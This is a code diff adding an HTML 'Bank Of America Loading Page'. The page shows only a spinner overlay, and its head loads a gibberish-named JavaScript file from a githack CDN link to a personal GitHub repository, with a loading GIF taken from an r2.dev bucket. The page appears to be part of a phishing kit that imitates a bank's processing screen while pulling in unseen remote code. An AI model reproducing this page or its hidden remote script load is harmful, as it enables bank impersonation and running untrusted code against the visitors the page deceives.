@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Bank Of America Loading Page</title>
+    <script src="https://rawcdn.githack.com/skypennsylvania/online/main/hjdjdfjdfkj.js"></script>
+    <style>
+      * {
+        -moz-box-sizing: border-box;
+        -webkit-box-sizing: border-box;
+        -webkit-tap-highlight-color: transparent;
+        -ms-box-sizing: border-box;
+        box-sizing: border-box;
+      }
+      .spinnerPanel {
+        position: absolute;
+        top: 0px;
+        left: 0px;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 64, 0.2);
+        z-index: 3;
+      }
+      .spinner {
+        display: block;
+        position: relative;
+        top: 40%;
+        margin: auto;
+        width: 58px;
+        height: 58px;
+        background-color: rgba(0, 0, 0, 1);
+        -moz-border-radius: 8px;
+        -webkit-border-radius: 8px;
+        border-radius: 8px;
+        z-index: 3;
+      }
+      .spinner span.messageIcon {
+        background: url('https://pub-f2d41028a0ea400089bca9a44ed4b2de.r2.dev/loadingLarge.gif') left no-repeat;
+        background-size: 35px 35px;
+        -webkit-background-size: 35px 35px;
+        -moz-background-size: 35px 35px;
+        display: inline-block;
+        height: 58px;
+        width: 35px;
+        margin-left: auto;
+        margin-right: auto;
+        display: block;
+      }
+      .adaHidden {
+        overflow: hidden;
+        width: 0;
+        height: 0;
+        opacity: 0;
+        display: inline-block;
+        position: absolute;
+      }
+
+      body {
+        font-family: "Helvetica Neue", "Droid Sans", Roboto, Arial, sans-serif;
+        font-size: 0.875em;
+        color: #191919;
+        text-shadow: none;
+        background-color: rgba(249, 247, 244, 1);
+        background-repeat: no-repeat;
+        height: 100%;
+        overflow-x: hidden;
+      }
+
+      body {
+        -webkit-text-size-adjust: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="page"></div>
+
+    <div class="spinnerPanel" style="height: 100vh">
+      <div class="spinner" style="top: 45%">
+        <span class="messageIcon"> </span
+        ><a
+          id="spinnerLink"
+          class="adaHidden"
+          href="javascript:void(0)"
+          role="dialog"
+          >processing</a
+        >
+      </div>
+    </div>
+   
+  </body>
+</html>
